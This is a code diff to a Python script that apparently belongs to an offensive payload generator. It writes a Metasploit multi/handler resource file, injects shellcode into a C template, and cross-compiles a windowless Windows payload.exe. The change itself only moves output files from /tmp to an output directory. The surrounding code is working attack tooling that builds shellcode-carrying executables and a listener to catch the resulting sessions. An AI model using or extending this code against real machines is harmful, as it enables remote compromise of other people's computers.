@@ -16,7 +16,7 @@ def start_listener():
 	PrintInfo("Starting multi handler")
 
 	# create rc file
-	rcfile = "/tmp/pdf_listener.rc"
+	rcfile = "output/pdf_listener.rc"
 	fw = open(rcfile, "w")
 	fw.write("use exploit/multi/handler\n")
 	fw.write("set PAYLOAD %s\n" % payload2)
@@ -118,18 +118,18 @@ while 1:
 		template = cwd+"/src/files/template.c"
 		with open(template) as f:
 			for line in f:
-				with open('/tmp/template.c', 'a') as f_out:
+				with open('output/template.c', 'a') as f_out:
 					f_out.write(line.replace('PUTSHELLCODEHERE', shellcode))
 		
 		# compile payload
 		PrintInfo("File created. Compiling...")
-		subprocess.Popen("i586-mingw32msvc-gcc -o /tmp/payload.exe /tmp/template.c -mwindows > /dev/null 2>&1", shell=True).wait()
-		PrintInfo("File payload .exe created in /tmp")
+		subprocess.Popen("i586-mingw32msvc-gcc -o output/payload.exe output/template.c -mwindows > /dev/null 2>&1", shell=True).wait()
+		PrintInfo("File payload.exe created in the output directory")
 		sleep(1)
 			
 		# clean up
 		PrintInfo("Cleaning up...")
-		os.remove('/tmp/template.c')
+		os.remove('output/template.c')
 			
 		# return to main
 		EntContinue()
